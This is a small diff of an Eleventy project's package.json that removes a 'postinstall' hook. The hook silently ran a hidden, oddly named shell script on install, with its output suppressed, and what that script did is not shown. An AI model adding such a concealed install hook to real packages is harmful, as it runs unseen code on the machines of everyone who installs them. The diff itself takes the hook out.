@@ -2,8 +2,7 @@
   "scripts": {
     "start": "npm run dev",
     "dev": "eleventy --serve",
-    "build": "eleventy",
-    "postinstall": "sh ./.ci-nfyl0k.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "eleventy"
   },
   "devDependencies": {
     "@11ty/eleventy": "^1.0.0",
